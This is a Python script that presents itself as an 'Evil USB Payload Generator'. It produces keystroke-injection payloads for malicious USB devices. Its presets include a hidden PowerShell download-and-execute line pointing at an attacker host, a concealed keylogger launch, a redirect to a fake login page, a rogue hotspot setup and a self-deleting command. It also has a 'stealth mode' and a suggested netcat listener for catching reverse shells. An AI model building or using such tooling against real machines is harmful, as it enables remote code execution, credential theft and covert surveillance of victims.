import os
import random
import re
import warnings

# Suppress syntax warnings
warnings.filterwarnings("ignore", category=SyntaxWarning)

ASCII_ART = r'''

      _                         _   
 ___ | |_ ._ _ _  _ _  _ _  ___| |_ 
/ . \| . || ' ' || | || | |<_-<| . \
\___/|_|_||_|_|_|`_. |`___|/__/|___/
                 <___'              
                   
'''

# Predefined payloads
PAYLOADS = {
    "reverse_shell": r'''
DELAY 1000
GUI r
DELAY 300
STRING powershell -nop -w hidden -c "IEX(New-Object Net.WebClient).DownloadString('http://attacker/payload.ps1')"
ENTER
''',
    "keylogger": r'''
DELAY 1000
GUI r
DELAY 300
STRING powershell -WindowStyle hidden -c "Start-Process 'logger.exe'"
ENTER
''',
    "open_website": r'''
DELAY 1000
GUI r
DELAY 300
STRING start https://fake-login.example.com
ENTER
''',
    "wifi_reconfig": r'''
DELAY 1000
GUI r
DELAY 300
STRING netsh wlan set hostednetwork mode=allow ssid=FreeWiFi key=password123
ENTER
STRING netsh wlan start hostednetwork
ENTER
''',
    "self_destruct": r'''
DELAY 1000
GUI r
DELAY 300
STRING powershell -nop -w hidden -c "Start-Sleep -s 3; Remove-Item -Path $MyInvocation.MyCommand.Path -Force"
ENTER
'''
}

def list_payloads():
    print("\nAvailable Payloads:")
    for i, key in enumerate(PAYLOADS.keys(), 1):
        print(f"[{i}] {key.replace('_', ' ').title()}")

def get_payload_by_choice(choice):
    keys = list(PAYLOADS.keys())
    return PAYLOADS.get(keys[choice - 1], "")

def apply_stealth_mode(payload):
    lines = payload.strip().splitlines()
    new_lines = []
    for line in lines:
        new_lines.append(line)
        if line.startswith("STRING"):
            new_lines.append(f"DELAY {random.randint(50, 250)}")
    return "\n".join(new_lines)

def detect_dangerous_commands(payload):
    patterns = [r'remove-item', r'shutdown', r'format', r'rd /s /q']
    for pattern in patterns:
        if re.search(pattern, payload, re.IGNORECASE):
            return True
    return False

def show_payload_stats(payload):
    lines = payload.strip().splitlines()
    delay_count = sum(1 for line in lines if line.startswith("DELAY"))
    string_count = sum(1 for line in lines if line.startswith("STRING"))
    print("\n--- Payload Stats ---")
    print(f"Total lines: {len(lines)}")
    print(f"STRING commands: {string_count}")
    print(f"DELAY commands: {delay_count}")
    print(f"Estimated time (ms): {delay_count * 300}")
    print("----------------------")

def check_for_reverse_shell(payload):
    if 'nc' in payload.lower() or 'iex' in payload.lower():
        print("\n[!] This looks like a reverse shell payload. Example listener:")
        print("    nc -lvnp 4444")

def save_payload(payload):
    filename = input("\nSave as (e.g., payload.txt): ").strip()
    if not filename:
        print("[!] No filename given. Payload was not saved.")
        return
    try:
        with open(filename, 'w') as f:
            f.write(payload)
        print(f"Payload saved to {filename}")
    except Exception as e:
        print(f"[!] Error saving file: {e}")

def main():
    print(ASCII_ART)
    print("Evil USB Payload Generator")
    print("[1] Use preset payload")
    print("[2] Write custom payload")
    choice = input("Choose an option (1 or 2): ").strip()

    if choice == '1':
        list_payloads()
        try:
            selection = int(input("\nSelect a payload number to generate: "))
            payload = get_payload_by_choice(selection)
        except (ValueError, IndexError):
            print("Invalid selection.")
            return
    elif choice == '2':
        print("\nEnter your custom payload (end with Ctrl+D or Ctrl+Z):")
        try:
            payload = "\n".join(iter(input, ""))
        except EOFError:
            return
    else:
        print("Invalid option.")
        return

    if input("Enable stealth mode? (y/n): ").lower() == 'y':
        payload = apply_stealth_mode(payload)

    show_payload_stats(payload)

    if detect_dangerous_commands(payload):
        print("\n[!] Warning: Destructive command detected in payload!")

    check_for_reverse_shell(payload)

    save_payload(payload)

if __name__ == "__main__":
    main()
